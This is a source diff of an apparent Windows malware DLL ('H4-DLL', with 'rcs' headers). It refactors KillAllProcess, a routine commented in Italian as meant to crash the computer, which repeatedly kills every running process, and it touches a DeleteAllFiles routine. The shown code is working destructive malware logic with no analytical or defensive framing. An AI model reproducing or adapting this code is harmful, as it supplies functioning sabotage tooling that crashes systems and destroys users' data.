@@ -2,6 +2,7 @@
 #include <stdio.h>
 #include <rcs/lock.h>
 #include <rcs/lock_guard.h>
+#include <rcs/enumprocess.h>
 #include <config.h>
 #include "common.h"
 #include "H4-DLL.h"
@@ -375,32 +376,32 @@ BOOL WINAPI DA_Uninstall(BYTE* dummy_param)
 }
 
 // Fa schiantare il computer 
-DWORD WINAPI KillAllProcess(DWORD dummy)
+static DWORD WINAPI KillAllProcess(DWORD dummy)
 {
-	HANDLE proc_list, hProc;
-	PROCESSENTRY32W lppe;
-
-	LOOP{
+	LOOP
+	{
 		Sleep(250);
-		if ((proc_list = FNC(CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, NULL)) != INVALID_HANDLE_VALUE) {
-			lppe.dwSize = sizeof(PROCESSENTRY32W);
-			if (FNC(Process32FirstW)(proc_list,  &lppe)) {
-				do {
-					if (lppe.th32ProcessID != GetCurrentProcessId()) {
-						if (hProc = FNC(OpenProcess)(PROCESS_TERMINATE, FALSE, lppe.th32ProcessID)) {
-							TerminateProcess(hProc, 0);
-							CloseHandle(hProc);
-						}
-					}
-				} while (FNC(Process32NextW)(proc_list, &lppe));
+
+		EnumerateProcess processes;
+
+		while (processes())
+		{
+			if (processes.pe32.th32ProcessID != GetCurrentProcessId())
+			{
+				HANDLE hProc = NULL;
+
+				if (hProc = FNC(OpenProcess)(PROCESS_TERMINATE, FALSE, processes.pe32.th32ProcessID)) {
+					TerminateProcess(hProc, 0);
+					CloseHandle(hProc);
+				}
 			}
-			CloseHandle(proc_list);
 		}
 	}
+
 	return 0;
 }
 
-void DeleteAllFiles(LPCWSTR lpEnvironmentVariable, LPCWSTR directory)
+static void DeleteAllFiles(LPCWSTR lpEnvironmentVariable, LPCWSTR directory)
 {
 	WCHAR sys_path[MAX_PATH];
 	WCHAR search_path[MAX_PATH];
